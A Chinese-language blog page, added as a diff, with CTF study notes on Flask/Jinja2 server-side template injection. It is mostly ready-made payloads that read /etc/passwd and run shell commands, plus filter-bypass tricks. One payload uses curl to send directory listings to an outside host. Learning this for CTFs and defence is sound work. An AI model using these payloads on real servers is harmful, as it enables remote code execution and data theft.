@@ -1,0 +1,524 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Bsmslwx">
+  <meta name="keywords" content="">
+  
+  <title>ssti ~ BsmslwxBlog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":80,"cursorChar":".","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Bsmslwx</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg4.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ssti">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-10 00:51" pubdate>
+        2021年7月10日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ssti</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年7月15日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="ssti模板注入知识"><a href="#ssti模板注入知识" class="headerlink" title="ssti模板注入知识"></a>ssti模板注入知识</h1><h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><p>参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(服务器模板注入)</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-47685-1-1.html">浅析SSTI(python沙盒绕过)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/96480967">SSTI完全学习</a></p>
+<p>由于ctf常考的ssti为flask/jinja所以以此为例</p>
+<h2 id="渲染模板flask-jinja"><a href="#渲染模板flask-jinja" class="headerlink" title="渲染模板flask/jinja"></a>渲染模板flask/jinja</h2><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p>
+<figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown"><span class="hljs-strong">__dict__</span> 保存类实例或对象实例的属性变量键值对字典<br><span class="hljs-strong">__class__</span>  返回类型所属的对象<br><span class="hljs-strong">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-strong">__bases__</span>   返回该对象所继承的基类<br>// <span class="hljs-strong">__base__</span>和<span class="hljs-strong">__mro__</span>都是用来寻找基类的<br><br><span class="hljs-strong">__subclasses__</span>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class="hljs-strong">__init__</span>  类的初始化方法<br><span class="hljs-strong">__globals__</span>  对包含函数全局变量的字典的引用<br></code></pre></div></td></tr></table></figure>
+
+<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>官方的漏洞利用方法：</p>
+<ul>
+<li>{{}}用于将表达式打印到模板输出，比如我们一般在里面输入 2-1 ， 2*2 ，或者是字符串，调用对象的方法，都会渲染出结果
+- {%%} 主要用来声明变量，也可以用于条件语句和循环语句。 
+
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 遍历数组</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125; <br><span class="hljs-comment"># 如果有catch_warnings进行下一步操作</span><br>&#123;% <span class="hljs-keyword">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;<br><span class="hljs-comment"># 遍历c位置的全部模板方法和全局遍历</span><br>  &#123;% <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;<br>    <span class="hljs-comment"># 如果b中有dict字典</span><br>  &#123;% <span class="hljs-keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;<br>    <span class="hljs-comment"># 且eval在其中</span><br>    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() %&#125;<br>      <span class="hljs-comment"># 执行命令</span><br>      &#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;<br>    &#123;% endif %&#125;<br>  &#123;% endif %&#125;<br>  &#123;% endfor %&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></div></td></tr></table></figure>
+## 判断
+
+此处为常见的判断方法
+
+![](https://img2020.cnblogs.com/blog/2454260/202107/2454260-20210710010808516-977697115.png)
+
+## 攻击流程
+
+{{config}}可以获取当前设置，如果题目类似app.config ['FLAG'] = os.environ.pop（'FLAG'），那可以直接访问{{config['FLAG']}}或者{{config.FLAG}}得到flag</li>
+</ul>
+<p>获取基本类</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>]<br>&#123;&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]<br><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]<br><span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]<br>request.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">8</span>] <span class="hljs-comment">//针对jinjia2/flask为[9]适用</span><br></code></pre></div></td></tr></table></figure>
+
+<p>获取基本类后，继续向下获取基本类(object)的子类</p>
+<figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-tag">object</span><span class="hljs-selector-class">.__subclasses__</span>()<br></code></pre></div></td></tr></table></figure>
+
+<p>找到重载过的<code>__init__</code>类(在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">99</span>].__init__<br>&lt;slot <span class="hljs-keyword">wrapper</span> <span class="hljs-string">&#x27;__init__&#x27;</span> <span class="hljs-keyword">of</span> <span class="hljs-string">&#x27;object&#x27;</span> objects&gt;<br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__<br>&lt;unbound <span class="hljs-keyword">method</span> WarningMessage.__init__&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>查看其引用<code>__builtins__</code></p>
+<blockquote>
+<p><strong>builtins</strong>即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于<strong>builtins</strong>却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块</p>
+</blockquote>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;__builtins__&#x27;]<br></code></pre></div></td></tr></table></figure>
+
+<p>这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能</p>
+<figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;F://GetFlag.txt&#x27;</span>).read()<br></code></pre></div></td></tr></table></figure>
+
+<p>除此外还有其他的调用方式</p>
+<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>上面的方法读文件</p>
+<p>方法1</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.__subclasses__()<span class="hljs-selector-attr">[59]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;file&#x27;</span>]</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<span class="hljs-selector-class">.read</span>()    #将read() 修改为 write() 即为写文件<br></code></pre></div></td></tr></table></figure>
+
+<p>存在的子模块可以通过.index()来进行查询，如果存在的话返回索引，直接调用即可</p>
+<p>方法2</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">&gt;&gt;&gt; &#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>].<span class="hljs-constructor">__subclasses__()</span>.index(file)<br><span class="hljs-number">40</span><br><span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">40</span>]</span>(&#x27;/etc/passwd&#x27;).read<span class="hljs-literal">()</span> #将read<span class="hljs-literal">()</span> 修改为 write<span class="hljs-literal">()</span> 即为写文件<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="方法1-利用eval-进行命令执行"><a href="#方法1-利用eval-进行命令执行" class="headerlink" title="方法1 利用eval 进行命令执行"></a>方法1 利用eval 进行命令执行</h3><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;__builtins__&#x27;]<span class="hljs-literal">[&#x27;<span class="hljs-identifier">eval</span>&#x27;]</span>(&#x27;<span class="hljs-constructor">__import__(<span class="hljs-string">&quot;os&quot;</span>)</span>.popen(<span class="hljs-string">&quot;whoami&quot;</span>).read<span class="hljs-literal">()</span>&#x27;)<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="方法2-利用warnings-catch-warnings-进行命令执行"><a href="#方法2-利用warnings-catch-warnings-进行命令执行" class="headerlink" title="方法2 利用warnings.catch_warnings 进行命令执行"></a>方法2 利用warnings.catch_warnings 进行命令执行</h3><p>查看<code>warnings.catch_warnings</code>方法的位置</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">&gt;&gt;&gt; <span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>).index(warnings.catch_warnings)<br><span class="hljs-number">59</span><br></code></pre></div></td></tr></table></figure>
+
+<p>查看<code>linecatch</code>的位置</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span></span>keys<span class="hljs-literal">()</span>.index(&#x27;linecache&#x27;)<br><span class="hljs-number">25</span><br></code></pre></div></td></tr></table></figure>
+
+<p>查找<code>os</code>模块的位置</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;linecache&#x27;].<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__dict__</span>.</span></span>keys<span class="hljs-literal">()</span>.index(&#x27;os&#x27;)<br><span class="hljs-number">12</span><br></code></pre></div></td></tr></table></figure>
+
+<p>查找<code>system</code>方法的位置(在这里使用<code>os.open().read()</code>可以实现一样的效果,步骤一样,不再复述)</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;linecache&#x27;].<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__dict__</span>.</span></span>values<span class="hljs-literal">()</span><span class="hljs-literal">[<span class="hljs-number">12</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__dict__</span>.</span></span>keys<span class="hljs-literal">()</span>.index(&#x27;system&#x27;)<br><span class="hljs-number">144</span><br></code></pre></div></td></tr></table></figure>
+
+<p>调用<code>system</code>方法</p>
+<figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;linecache&#x27;</span>]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-class">.values</span>()<span class="hljs-selector-attr">[12]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-class">.values</span>()<span class="hljs-selector-attr">[144]</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-selector-tag">root</span><br><span class="hljs-selector-tag">0</span><br></code></pre></div></td></tr></table></figure>
+
+<h3 id="方法3-利用commands-进行命令执行"><a href="#方法3-利用commands-进行命令执行" class="headerlink" title="方法3 利用commands 进行命令执行"></a>方法3 利用commands 进行命令执行</h3><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less">&#123;&#125;<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__import__&#x27;</span>]</span>(<span class="hljs-string">&#x27;commands&#x27;</span>)<span class="hljs-selector-class">.getstatusoutput</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>&#123;&#125;<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__import__&#x27;</span>]</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>&#123;&#125;<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-class">.__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;id&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br></code></pre></div></td></tr></table></figure>
+
+
+
+<h1 id="基础绕过"><a href="#基础绕过" class="headerlink" title="基础绕过"></a>基础绕过</h1><h2 id="1-过滤-和"><a href="#1-过滤-和" class="headerlink" title="1)过滤[]和."></a>1)过滤[]和.</h2><p>只过滤<code>[]</code></p>
+<blockquote>
+<p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br> <code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()</code></p>
+</blockquote>
+<p>若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code><br>将<code>request.__class__</code>改成<code>request|attr(&quot;__class__&quot;)</code></p>
+<h2 id="2-过滤"><a href="#2-过滤" class="headerlink" title="2)过滤_"></a>2)过滤_</h2><p>利用<code>request.args</code>属性<br><code>{{  ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__</code></p>
+<p> 将其中的request.args改为request.values则利用post的方式进行传参</p>
+<h2 id="3-关键字过滤"><a href="#3-关键字过滤" class="headerlink" title="3)关键字过滤"></a>3)关键字过滤</h2><ol>
+<li>base64编码绕过<br> <code>__getattribute__</code>使用实例访问属性时,调用该方法</li>
+</ol>
+<p>例如被过滤掉<code>__class__</code>关键词</p>
+<p><code>{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}</code></p>
+<ol start="2">
+<li>字符串拼接绕过<br><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}{{[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]}}</code></li>
+</ol>
+<h2 id="4-过滤双括弧"><a href="#4-过滤双括弧" class="headerlink" title="4)过滤双括弧"></a>4)过滤双括弧</h2><p>使用对应if语句<code>{%if ..%}1{% endif %}</code>,例如</p>
+<p><code>{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d \`ls / |  grep flag\`;') %}1{% endif %}</code></p>
+<p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p>
+<p><code>{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}1{% endif %}</code></p>
+<h2 id="5-引号内十六进制绕过"><a href="#5-引号内十六进制绕过" class="headerlink" title="5)引号内十六进制绕过"></a>5)引号内十六进制绕过</h2><p><code>{{"".__class__}}
+{{""["\x5f\x5fclass\x5f\x5f"]}}</code><br><code>_</code>是<code>\x5f</code>，<code>.</code>是<code>\x2E</code></p>
+<h2 id="6-“-‘-chr等被过滤，无法引入字符串"><a href="#6-“-‘-chr等被过滤，无法引入字符串" class="headerlink" title="6)“ ‘ chr等被过滤，无法引入字符串"></a>6)“ ‘ chr等被过滤，无法引入字符串</h2><ul>
+<li>直接拼接键名</li>
+</ul>
+<figure class="highlight erlang"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">dict</span><span class="hljs-params">(buil=aa,tins=dd)</span>|<span class="hljs-title">join</span><span class="hljs-params">()</span></span><br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li>
+</ul>
